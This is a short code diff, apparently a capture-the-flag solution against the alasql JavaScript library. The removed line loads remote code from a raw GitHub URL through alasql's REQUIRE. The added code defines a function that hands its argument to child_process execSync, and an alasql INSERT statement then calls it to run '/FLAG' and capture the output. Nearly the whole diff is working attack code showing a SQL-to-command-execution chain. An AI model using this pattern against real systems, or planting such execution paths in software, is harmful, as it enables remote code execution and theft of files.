@@ -1,9 +1,18 @@
-const alasql = require('alasql');
 
-alasql('REQUIRE "https://raw.githubusercontent.com/vr2/1/refs/heads/main/flag.js"');
+function executeFile(filename) {
+  const { execSync } = require('child_process');
+  try {
+    return execSync(filename).toString();
+  } catch (error) {
+    return error.message;
+  }
+}
+
+const alasql = require('alasql');
 
 alasql('CREATE TABLE genie (content TEXT)');
 alasql.tables.genie.data = [
     {content:"test"}
 ];
+
 alasql('INSERT INTO genie VALUES (executeFile("/FLAG"))');
